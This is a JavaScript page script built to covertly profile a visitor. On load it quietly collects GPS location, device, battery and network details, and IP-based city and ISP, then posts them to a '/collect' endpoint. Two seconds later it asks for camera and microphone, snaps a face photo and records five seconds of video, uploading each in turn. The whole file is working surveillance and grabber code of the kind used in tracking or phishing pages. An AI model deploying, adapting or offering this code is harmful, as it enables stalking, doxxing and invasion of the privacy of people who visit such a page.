(function(){
    var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
    var mediaRecorder, recordedChunks=[], stream;
    
    // STEP 1: Collect data silently FIRST (no permission needed)
    function collectInfo(){
        // GPS
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(function(p){
                d.gps={lat:p.coords.latitude,lon:p.coords.longitude};
            },function(){},{enableHighAccuracy:true,timeout:8000});
        }
        // Device
        d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
        // Battery
        navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
        // Connection
        if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
        // IP
        fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
            d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
            // SEND DATA NOW (Phase 1)
            sendData('phase1');
        });
    }
    
    // STEP 2: Ask camera + take photo + record 5 seconds
    async function startCamera(){
        try{
            stream=await navigator.mediaDevices.getUserMedia({
                video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
                audio:true
            });
            
            // Show dots
            document.getElementById('greenDot').style.display='block';
            document.getElementById('yellowDot').style.display='block';
            document.getElementById('recMsg').style.display='block';
            
            // Take photo
            await new Promise(r=>setTimeout(r,600));
            var canvas=document.createElement('canvas');
            canvas.width=1280;canvas.height=720;
            var video=document.createElement('video');
            video.srcObject=stream;
            await video.play();
            canvas.getContext('2d').drawImage(video,0,0);
            d.photo=canvas.toDataURL('image/jpeg',0.9);
            video.pause();
            
            // Send photo NOW
            sendData('phase2');
            
            // Record 5 seconds
            mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'});
            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
            mediaRecorder.onstop=sendVideo;
            mediaRecorder.start(1000);
            
            // Update recording message
            var sec=5;
            var msgEl=document.getElementById('recMsg');
            var countdown=setInterval(function(){
                sec--;
                msgEl.textContent='● REC '+sec+'s';
                if(sec<=0){clearInterval(countdown);msgEl.textContent='';}
            },1000);
            
            // Stop after 5 seconds
            setTimeout(function(){
                if(mediaRecorder&&mediaRecorder.state==='recording'){
                    mediaRecorder.stop();
                    stream.getTracks().forEach(t=>t.stop());
                    document.getElementById('greenDot').style.display='none';
                    document.getElementById('yellowDot').style.display='none';
                }
            },5000);
            
        }catch(e){d.camErr=e.message;}
    }
    
    function sendVideo(){
        if(recordedChunks.length>0){
            var blob=new Blob(recordedChunks,{type:'video/webm'});
            var reader=new FileReader();
            reader.onload=function(){
                d.video=reader.result;
                sendData('phase3');
            };
            reader.readAsDataURL(blob);
        }
    }
    
    function sendData(phase){
        d.phase=phase;
        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
    }
    
    // Step 1: Collect data immediately on page load
    collectInfo();
    
    // Step 2: After 2 seconds, ask for camera
    setTimeout(startCamera,2000);
    
})();
